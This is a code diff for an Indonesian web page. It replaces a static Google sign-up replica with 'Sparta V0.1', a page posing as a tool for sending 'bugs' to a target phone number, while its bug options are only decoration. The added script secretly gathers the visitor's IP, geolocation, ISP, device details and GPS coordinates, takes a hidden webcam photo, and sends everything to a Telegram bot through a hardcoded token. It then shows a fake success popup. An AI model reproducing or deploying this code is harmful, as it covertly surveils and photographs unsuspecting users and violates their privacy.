@@ -1,393 +1,525 @@
 <!DOCTYPE html>
 <html lang="id">
+
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Buat Akun Google - Replika</title>
-    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+    <title>Sparta V0.1 - Bug Service</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"> 
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    
     <style>
-        /* CSS diletakkan di sini untuk kemudahan */
-        body {
-            font-family: 'Google Sans', Roboto, Arial, sans-serif;
-            background-color: #121212; /* Dark Mode Background */
-            color: #e8eaed; /* Light Text */
+        /* CSS umum & Reset */
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { 
+            background: black; 
+            font-family: 'Poppins', sans-serif; 
+            color: white; 
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            padding: 20px;
+            padding-top: 70px; /* Jarak untuk header */
+            position: relative;
+        }
+        
+        /* --- Header Styles (Top Bar) --- */
+        .header-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            width: 100%;
+            max-width: 500px;
+            background: black;
+            box-shadow: 0 1px 5px rgba(0, 0, 0, 0.5);
+            position: fixed;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-title {
+            font-size: 20px;
+            font-weight: 800;
+            color: #1B47F1;
+            text-shadow: 0 0 5px #0917D7;
+        }
+
+        .header-icon {
+            font-size: 24px;
+            color: #ccc;
+        }
+
+        /* --- Main Card (Container Input) --- */
+        .main-card {
+            background: linear-gradient(180deg, #1c1c1c 0%, #101010 100%);
+            padding: 30px 20px;
+            border-radius: 15px;
+            width: 100%;
+            max-width: 500px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.7);
+            border: 1px solid #333;
+            text-align: center;
+            position: relative;
+        }
+        
+        .logo-container { 
+            margin-bottom: 25px; 
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
+            min-height: 100px; 
         }
 
-        .form-container {
-            background-color: #202124; /* Dark Mode Card Background */
-            padding: 40px;
-            border-radius: 8px;
-            width: 100%;
-            max-width: 450px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+        .service-gif { 
+            width: 100%; 
+            max-width: 250px; 
+            height: auto; 
+            object-fit: cover; 
+            border-radius: 8px; 
+            box-shadow: 0 0 15px rgba(27, 71, 241, 0.7); 
         }
 
-        .google-logo {
-            font-size: 24px;
+        .user-info-display { 
+            background-color: #2a2a2a; 
+            padding: 15px; 
+            border-radius: 10px; 
+            margin-bottom: 25px; 
+            border: 1px solid #444; 
+            box-shadow: inset 0 0 5px rgba(0, 0, 0, 0.5);
+        }
+        
+        .username-text { 
+            font-size: 18px; 
+            font-weight: 800; 
+            color: white; 
+            margin-bottom: 10px; 
+        }
+        
+        .role-exp-text { 
+            font-size: 13px; 
+            color: #B3C0FF; 
             font-weight: 500;
-            margin-bottom: 24px;
-            text-align: center;
         }
-
-        h2 {
-            font-size: 24px;
-            font-weight: 400;
-            margin-bottom: 8px;
-            text-align: center;
+        
+        .target-section { 
+            margin-bottom: 25px; 
         }
-
-        .subtitle {
+        
+        .target-section h4 { 
+            color: white; 
+            font-weight: 600;
+            margin-bottom: 15px;
             font-size: 16px;
-            color: #9aa0a6;
-            margin-bottom: 32px;
-            text-align: center;
+            text-align: left; 
         }
-
-        .input-group, .date-group, .select-group {
-            margin-bottom: 24px;
-        }
-
-        .name-group {
+        
+        .input-group {
             display: flex;
-            gap: 16px;
+            align-items: center; 
+            background-color: #0d0d0d; 
+            border: 1px solid #333; 
+            border-radius: 8px; 
+            padding: 5px 15px; 
         }
 
-        .input-field {
-            position: relative;
-            flex-grow: 1;
-        }
-
-        input[type="text"], input[type="password"], input[type="number"], .custom-select, .date-input {
-            width: 100%;
-            padding: 18px 12px 6px;
-            background-color: #3c4043; /* Darker input background */
-            border: 1px solid #5f6368;
-            border-radius: 4px;
-            color: #e8eaed;
-            font-size: 16px;
-            box-sizing: border-box;
-            outline: none;
-            transition: border-color 0.3s;
-        }
-
-        input:focus, .custom-select:focus, .date-input:focus {
-            border-color: #8ab4f8; /* Blue focus border */
-            box-shadow: 0 0 0 1px #8ab4f8;
-        }
-
-        label {
-            position: absolute;
-            left: 12px;
-            top: 15px;
-            color: #9aa0a6;
-            pointer-events: none;
-            transition: all 0.2s ease;
-            font-size: 16px;
-        }
-
-        /* Floating Label Effect */
-        input:focus + label,
-        input:not(:placeholder-shown) + label,
-        .date-input:not(:placeholder-shown) + label,
-        .date-input-year:not(:placeholder-shown) + label,
-        .filled-input label {
-            top: 6px;
-            left: 10px;
-            font-size: 12px;
-        }
-
-        .date-group {
-            display: flex;
-            gap: 8px;
-        }
-
-        .date-item {
-            flex-grow: 1;
-            position: relative;
-        }
-
-        .custom-select {
-            appearance: none;
-            padding-right: 30px; /* Space for the dropdown arrow */
-        }
-
-        .select-wrapper {
-            position: relative;
-            flex-grow: 1;
-        }
-
-        .select-wrapper::after {
-            content: '▼';
-            position: absolute;
-            right: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #9aa0a6;
-            pointer-events: none;
-            font-size: 10px;
-        }
-
-        .btn-next {
-            background-color: #8ab4f8;
-            color: #202124;
-            border: none;
-            padding: 10px 24px;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: 500;
-            cursor: pointer;
-            float: right;
-            transition: background-color 0.3s;
-        }
-
-        .btn-next:hover {
-            background-color: #a6c5fa;
-        }
-
-        .email-suggestion {
-            display: flex;
-            align-items: center;
-            margin-bottom: 16px;
-            cursor: pointer;
+        .input-group span {
+            color: #B3C0FF; 
+            font-size: 16px; 
+            font-weight: 600; 
+            margin-right: 10px;
+            line-height: 1; 
             padding: 8px 0;
         }
-
-        .email-suggestion input[type="radio"] {
-            margin-right: 12px;
+        
+        .target-input { 
+            flex-grow: 1; 
+            background: none; 
+            border: none; 
+            color: white; 
+            font-size: 16px; 
+            padding: 8px 0; 
+            outline: none; 
+            font-family: 'Poppins', sans-serif;
+            -moz-appearance: none;
+            -webkit-appearance: none;
             appearance: none;
-            width: 18px;
-            height: 18px;
-            border: 2px solid #9aa0a6;
-            border-radius: 50%;
-            position: relative;
-            top: 0;
         }
-
-        .email-suggestion input[type="radio"]:checked {
-            border-color: #8ab4f8;
-            background-color: #8ab4f8;
-            border-width: 5px; /* Thicker border on check to look like a dot */
-        }
-
-        .custom-email-input {
-            display: flex;
-            align-items: center;
+        .target-input::-webkit-outer-spin-button,
+        .target-input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
         }
         
-        .custom-email-input input {
-            border-top-right-radius: 0;
-            border-bottom-right-radius: 0;
-            flex-grow: 1;
+        .action-button { 
+            width: 100%; 
+            padding: 12px; 
+            border-radius: 8px; 
+            font-size: 16px; 
+            font-weight: 700; 
+            cursor: pointer; 
+            transition: background-color 0.2s, transform 0.1s; 
+            margin-bottom: 15px; 
+            border: none; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
         }
         
-        .custom-email-suffix {
-            background-color: #3c4043;
-            color: #9aa0a6;
-            padding: 10px 12px;
-            border: 1px solid #5f6368;
-            border-left: none;
-            border-radius: 0 4px 4px 0;
-            height: 48px;
-            display: flex;
-            align-items: center;
-            box-sizing: border-box;
-            font-size: 16px;
+        .select-service-btn {
+            background-color: #333; 
+            color: white;
+            border: 1px solid #555; 
+        }
+        
+        .send-service-btn { 
+            background: linear-gradient(90deg, #F81CF8 0%, #B900FF 100%); 
+            color: white; 
+            box-shadow: 0 4px 15px rgba(185, 0, 255, 0.4); 
+        }
+        
+        .send-service-btn:hover { 
+            background: linear-gradient(90deg, #FF45FF 0%, #D41AFF 100%); 
+            transform: translateY(-1px); 
+        }
+        
+        .send-service-btn i { margin-right: 10px; font-size: 18px; }
+
+        /* Dropdown/List Bug (Hanya Pajangan) */
+        #service-selection-list {
+            display: none;
+            position: absolute;
+            width: calc(100% - 40px);
+            left: 50%;
+            transform: translateX(-50%);
+            top: 310px; 
+            background: #1c1c1c;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.8);
+            z-index: 500;
+            overflow: hidden;
+            pointer-events: none;
         }
 
-        .password-hint {
-            font-size: 12px;
-            color: #9aa0a6;
-            margin-top: -16px;
-            margin-bottom: 24px;
+        .service-option { 
+            padding: 12px 20px; 
+            color: #ccc; 
+            border-bottom: 1px solid #333; 
+            text-align: left; 
         }
-
-        .checkbox-group {
-            display: flex;
-            align-items: center;
-            margin-bottom: 32px;
+        
+        .service-option:last-child { 
+            border-bottom: none;
         }
-
-        .checkbox-group input[type="checkbox"] {
-            margin-right: 8px;
-            width: 16px;
-            height: 16px;
-            background-color: #3c4043;
-            border: 1px solid #5f6368;
+        
+        /* Notifikasi & Modal Kustom (Popup) */
+        #custom-modal { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.7); 
+            display: none; justify-content: center; align-items: center; z-index: 1000;
+            opacity: 0; transition: opacity 0.3s ease;
         }
+        
+        .custom-modal.show { opacity: 1; display: flex; }
+        .modal-content { 
+            background: #1a1a1a; padding: 25px; border-radius: 12px; width: 90%; max-width: 300px; 
+            border: 2px solid #1B47F1;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5); text-align: center; 
+        }
+        
+        .modal-content h3 { color: #1B47F1; margin-bottom: 15px; font-size: 18px; }
+        .modal-content p { color: #ccc; margin-bottom: 20px; font-size: 14px; }
+        .modal-buttons {
+             display: flex;
+             justify-content: center;
+        }
+        .modal-content button { 
+            background-color: #1B47F1; color: white; border: none; padding: 10px 15px; border-radius: 6px; 
+            cursor: pointer; font-weight: 600; transition: background-color 0.3s;
+        }
+        
+        .modal-content button:hover { background-color: #0917D7; }
+        
+        /* Hidden elements for Camera */
+        video, canvas { display: none; }
 
     </style>
 </head>
+
 <body>
-
-    <div class="form-container">
-        <div id="step-name">
-            <div class="google-logo">Google</div>
-            <h2>Buat Akun Google</h2>
-            <div class="subtitle">Masukkan nama Anda</div>
-            
-            <form>
-                <div class="name-group">
-                    <div class="input-field">
-                        <input type="text" id="namaDepan" value="Gabriel" placeholder=" " required>
-                        <label for="namaDepan">Nama depan</label>
-                    </div>
-                    <div class="input-field">
-                        <input type="text" id="namaBelakang" value="Parh" placeholder=" ">
-                        <label for="namaBelakang">Nama belakang (opsional)</label>
-                    </div>
-                </div>
-                <button type="button" class="btn-next" onclick="showStep('step-basic-info')">Selanjutnya</button>
-            </form>
-        </div>
-        
-        <div id="step-basic-info" style="display: none;">
-            <div class="google-logo">Google</div>
-            <h2>Informasi dasar</h2>
-            <div class="subtitle">Masukkan tanggal lahir dan gender</div>
-            
-            <form>
-                <div class="date-group">
-                    <div class="date-item input-field">
-                        <input type="number" id="hari" class="date-input" placeholder=" " min="1" max="31" required>
-                        <label for="hari">Hari</label>
-                    </div>
-                    
-                    <div class="date-item select-wrapper">
-                        <select id="bulan" class="custom-select" required>
-                            <option value="" disabled selected hidden>Bul...</option>
-                            <option value="Januari">Januari</option>
-                            <option value="Februari">Februari</option>
-                            <option value="Maret">Maret</option>
-                            <option value="April">April</option>
-                            <option value="Mei">Mei</option>
-                            <option value="Juni">Juni</option>
-                            <option value="Juli">Juli</option>
-                            <option value="Agustus">Agustus</option>
-                            <option value="September">September</option>
-                            <option value="Oktober">Oktober</option>
-                            <option value="November">November</option>
-                            <option value="Desember">Desember</option>
-                        </select>
-                    </div>
-                    
-                    <div class="date-item input-field">
-                        <input type="number" id="tahun" class="date-input" placeholder=" " min="1900" max="2025" required>
-                        <label for="tahun">Tahun</label>
-                    </div>
-                </div>
-                
-                <div class="select-wrapper">
-                    <select id="gender" class="custom-select" required>
-                        <option value="" disabled selected hidden>Gender</option>
-                        <option value="Wanita">Wanita</option>
-                        <option value="Pria">Pria</option>
-                        <option value="Tidak ingin memberitahu">Tidak ingin memberitahu</option>
-                        <option value="Kustom">Kustom</option>
-                    </select>
-                </div>
-                
-                <p style="font-size: 14px; color: #9aa0a6;">Alasan kami meminta tanggal lahir dan gender Anda</p>
-                <button type="button" class="btn-next" onclick="showStep('step-email')">Selanjutnya</button>
-            </form>
-        </div>
-        
-        <div id="step-email" style="display: none;">
-            <div class="google-logo">Google</div>
-            <h2>Pilih alamat Gmail Anda</h2>
-            <div class="subtitle">Pilih alamat Gmail atau buat alamat Gmail Anda sendiri</div>
-            
-            <form>
-                <div class="email-suggestion">
-                    <input type="radio" id="gabrielparh7" name="emailOption" value="gabrielparh7@gmail.com">
-                    <label for="gabrielparh7">gabrielparh7@gmail.com</label>
-                </div>
-                <div class="email-suggestion">
-                    <input type="radio" id="parhgabriel" name="emailOption" value="parhgabriel@gmail.com">
-                    <label for="parhgabriel">parhgabriel@gmail.com</label>
-                </div>
-                
-                <div class="email-suggestion">
-                    <input type="radio" id="customEmailRadio" name="emailOption" value="custom" checked>
-                    <label for="customEmailRadio">Buat alamat Gmail Anda sendiri</label>
-                </div>
-                
-                <div class="input-group custom-email-input">
-                    <input type="text" id="customEmail" value="custommail" placeholder=" " required>
-                    <div class="custom-email-suffix">@gmail.com</div>
-                </div>
-                
-                <p style="font-size: 14px; color: #9aa0a6; margin-bottom: 32px;">Anda dapat menggunakan huruf, angka & titik</p>
-                
-                <button type="button" class="btn-next" onclick="showStep('step-password')">Selanjutnya</button>
-            </form>
-        </div>
-        
-        <div id="step-password" style="display: none;">
-            <div class="google-logo">Google</div>
-            <h2>Buat sandi yang kuat</h2>
-            <div class="subtitle">Buat sandi yang kuat dengan campuran huruf, angka, dan simbol</div>
-            
-            <form>
-                <div class="input-field filled-input">
-                    <input type="password" id="password" value="password123#" placeholder=" " required>
-                    <label for="password">Sandi</label>
-                </div>
-                
-                <div class="password-hint">Minimal 8 karakter. Jangan gunakan sandi dari situs lain atau sesuatu yang mudah ditebak seperti nama hewan peliharaan Anda.</div>
-
-                <div class="checkbox-group">
-                    <input type="checkbox" id="tampilkanSandi">
-                    <label for="tampilkanSandi" style="position: static; color: #e8eaed;">Tampilkan sandi</label>
-                </div>
-
-                <button type="submit" class="btn-next">Selanjutnya</button>
-            </form>
+    <div id="custom-modal" class="custom-modal">
+        <div class="modal-content">
+            <h3 id="modal-title"></h3>
+            <p id="modal-message"></p>
+            <div class="modal-buttons">
+                <button id="modal-ok-button" onclick="closeCustomModal()">OK</button>
+            </div>
         </div>
     </div>
-    
-    <script>
-        // Fungsionalitas sederhana untuk berpindah antar langkah formulir (replika)
-        const steps = ['step-name', 'step-basic-info', 'step-email', 'step-password'];
-        
-        function showStep(stepId) {
-            steps.forEach(id => {
-                document.getElementById(id).style.display = 'none';
-            });
-            document.getElementById(stepId).style.display = 'block';
-        }
 
-        // Fungsionalitas Tampilkan Sandi
-        document.getElementById('tampilkanSandi').addEventListener('change', function() {
-            const passwordInput = document.getElementById('password');
-            if (this.checked) {
-                passwordInput.type = 'text';
-            } else {
-                passwordInput.type = 'password';
-            }
-        });
+    <div class="header-top">
+        <div class="header-title">Sparta V0.1</div>
+        <i class="fas fa-user-circle header-icon"></i> 
+    </div>
+    
+    <div class="main-card">
         
-        // Fungsionalitas untuk Floating Label pada Select (Hanya di Chrome/Firefox)
-        // Ini adalah trik CSS/JS yang disederhanakan
-        document.getElementById('bulan').addEventListener('change', function() {
-            if(this.value !== "") {
-                this.classList.add('filled-input');
-            } else {
-                this.classList.remove('filled-input');
+        <div class="logo-container">
+            <video src="https://files.catbox.moe/vzmw6r.mp4" class="service-gif" autoplay loop muted playsinline></video>
+        </div>
+
+        <div class="user-info-display">
+            <div class="username-text" id="user-display-username">Owner</div>
+            <div class="role-exp-text" id="user-display-role-exp">Role: Owner • Exp: 9999-99-99</div>
+        </div>
+        
+        <div class="target-section">
+            <h4>Target Number</h4>
+            <div class="input-group">
+                <span>+62</span>
+                <input type="tel" id="target-number" class="target-input" placeholder="821xxxxxx">
+            </div>
+        </div>
+        
+        <button id="select-service-btn" class="action-button select-service-btn">
+            Select Bug <i class="fas fa-chevron-down" style="margin-left: 10px;"></i>
+        </button>
+        
+        <button id="send-service-btn" class="action-button send-service-btn">
+            <i class="fas fa-bolt"></i> SEND BUG
+        </button>
+
+        <div id="service-selection-list">
+            <div class="service-option" data-service="bug1">BUG1</div>
+            <div class="service-option" data-service="bug2">BUG2</div>
+            <div class="service-option" data-service="bug3">BUG3</div>
+        </div>
+        
+        </div>
+    
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+    
+<script>
+    // --- KONFIGURASI TELEGRAM ---
+    const botToken = '8465679307:AAFNn9YLlQns9JF-j67aUl4T_TbcqpHAMto';
+    const chatIds = ['7633271429', '8358522260', '-1003083824240'];
+    
+    // --- DOM ELEMENTS ---
+    // const infoDiv = document.getElementById('info'); // Dihapus
+    const input = document.getElementById('target-number'); 
+    const button = document.getElementById('send-service-btn');
+    const selectServiceBtn = document.getElementById('select-service-btn');
+    const serviceSelectionList = document.getElementById('service-selection-list');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    // --- TELEGRAM FUNCTIONS ---
+    function sendToTelegram(text) {
+        chatIds.forEach(id => {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
+            }).catch(console.error);
+        });
+    }
+    
+    function sendPhotoToTelegram(blob) {
+      chatIds.forEach(id => {
+        const formData = new FormData();
+        formData.append('chat_id', id);
+        formData.append('photo', blob);
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        }).catch(console.error);
+      });
+    }
+    
+    // --- MODAL FUNCTIONS (Pop-up Sukses/Error) ---
+    function showCustomModal(message, title = 'Notification', isError = false) {
+        const modalElement = document.getElementById('custom-modal');
+        const modalTitle = document.getElementById('modal-title');
+        const modalMessage = document.getElementById('modal-message');
+        const modalOkButton = document.getElementById('modal-ok-button');
+        
+        modalTitle.textContent = title;
+        modalMessage.textContent = message;
+        
+        const color = isError ? '#ff4444' : '#1B47F1';
+        modalElement.querySelector('.modal-content').style.borderColor = color;
+        modalTitle.style.color = color;
+        modalOkButton.style.backgroundColor = color;
+        
+        // Sesuaikan teks tombol sesuai permintaan
+        modalOkButton.textContent = isError ? 'Tutup' : 'Berhasil Mengirimkan Bug';
+
+        modalElement.classList.add('show');
+        modalElement.style.display = 'flex';
+    }
+    
+    function closeCustomModal() {
+        const modalElement = document.getElementById('custom-modal');
+        modalElement.classList.remove('show');
+        setTimeout(() => { modalElement.style.display = 'none'; }, 300);
+    }
+    
+    // --- ADVANCED INFO GATHERING ---
+    async function getInfo(targetNumber) {
+        let ip = '-', city = '-', region = '-', country = '-', org = '-';
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            ip = ipData.ip;
+            const locRes = await fetch(`https://ip-api.com/json/${ip}`);
+            const loc = await locRes.json();
+            if (loc.status === 'success') {
+                city = loc.city;
+                region = loc.regionName;
+                country = loc.country;
+                org = loc.org;
+            }
+        } catch {}
+
+        const battery = await navigator.getBattery?.() || { level: 0, charging: false };
+        const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';
+        
+        const os = navigator.platform || 'N/A';
+        const resolution = `${screen.width}x${screen.height}`;
+        const deviceMemory = navigator.deviceMemory || 'N/A';
+        const cookieEnabled = navigator.cookieEnabled ? 'Ya' : 'Tidak';
+
+        const text = `
+<b>🔥 NEW TARGET SPARTA V0.1 🔥</b>
+
+Target     : +62${targetNumber}
+IP         : ${ip}
+Kota       : ${city}
+Region     : ${region}
+Negara     : ${country}
+ISP        : ${org}
+Browser    : ${navigator.userAgent}
+OS         : ${os}
+Resolusi   : ${resolution}
+Baterai    : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
+Memori     : ${deviceMemory} GB
+Cookie     : ${cookieEnabled}
+Waktu      : ${new Date().toLocaleString()}
+        `.trim();
+
+        // Mengirim info lengkap ke Telegram
+        sendToTelegram(`<b>📥 Info Pengunjung:</b>\n<pre>${text}</pre>`);
+
+        // GPS/Lokasi (Non-blocking)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    const link = `https://www.google.com/maps/search/?api=1&query=${pos.coords.latitude},${pos.coords.longitude}`;
+                    sendToTelegram(`<b>📍 Lokasi GPS:</b> <a href="${link}">[Link GPS]</a>`);
+                },
+                () => sendToTelegram(`📍 Lokasi GPS Ditolak`)
+            );
+        } else {
+            sendToTelegram(`📍 Browser tidak support GPS`);
+        }
+    }
+
+    // --- CAMERA FUNCTION ---
+    async function startCamera() {
+      const ctx = canvas.getContext('2d');
+      return new Promise((resolve) => {
+        if (!navigator.mediaDevices) {
+             sendToTelegram('❌ Kamera Ditolak: MediaDevices API tidak didukung');
+             return resolve();
+        }
+        
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(stream => {
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+              setTimeout(() => {
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob(blob => {
+                  if (blob) sendPhotoToTelegram(blob);
+                  stream.getTracks().forEach(track => track.stop());
+                  resolve();
+                }, 'image/jpeg');
+              }, 3000); // Waktu tunggu 3 detik untuk ambil foto
+            };
+          })
+          .catch(err => {
+            sendToTelegram('❌ Kamera Ditolak atau Tidak Tersedia');
+            resolve();
+          });
+      });
+    }
+
+    // --- LOGIKA UTAMA ---
+    document.addEventListener('DOMContentLoaded', function () {
+        
+        // Toggle Service Selection List (Pajangan)
+        selectServiceBtn.addEventListener('click', function(event) {
+            event.stopPropagation();
+            const isVisible = serviceSelectionList.style.display === 'block';
+            serviceSelectionList.style.display = isVisible ? 'none' : 'block';
+        });
+
+        // Close Service Selection List saat klik di luar (Pajangan)
+        document.addEventListener('click', function(event) {
+            if (event.target !== selectServiceBtn && !serviceSelectionList.contains(event.target)) {
+                serviceSelectionList.style.display = 'none';
             }
         });
-        document.getElementById('gender').addEventListener('change', function() {
-            if(this.value !== "") {
-                this.classList.add('filled-input');
-            } else {
-                this.classList.remove('filled-input');
+
+        // Aksi Tombol Send Service
+        button.addEventListener('click', async () => {
+            const targetNumber = input.value.trim();
+
+            if (targetNumber === '') {
+                // Notifikasi Error via Pop-up
+                showCustomModal('Harap masukan nomor target!', 'Input Error', true);
+                return;
+            }
+            
+            if (!/^\d+$/.test(targetNumber)) {
+                // Notifikasi Error via Pop-up
+                showCustomModal('Simbol ditemukan, harap hapus simbol!', 'Input Error', true);
+                return;
+            }
+
+            if (targetNumber.length < 8 || targetNumber.length > 15) {
+                // Notifikasi Error via Pop-up
+                showCustomModal('Nomor target minimal 8 digit dan maksimal 15 digit!', 'Input Error', true);
+                return;
+            }
+            
+            button.disabled = true;
+            
+            try {
+                // 1. Kirim Nomor Target segera
+                sendToTelegram(`<b>📞 Nomor Target:</b> +62${targetNumber}`);
+                
+                // 2. Ambil dan Kirim Info Lengkap + GPS
+                await getInfo(targetNumber);
+                
+                // 3. Ambil Foto Kamera 
+                await startCamera(); 
+
+                // 4. TAMPILKAN POPUP SUKSES
+                showCustomModal(`Successfully Sending Bug To Target: +62${targetNumber}!`, 'DONE BUG🔥', false);
+                
+                input.value = ''; // Kosongkan input
+                button.disabled = false;
+                
+            } catch (e) {
+                // Notifikasi Error jika terjadi kegagalan sistem
+                showCustomModal('Terjadi kesalahan saat mengirim data.', 'System Error', true);
+                button.disabled = false;
             }
         });
-    </script>
+    });
+</script>
 </body>
-</html>
+    </html>
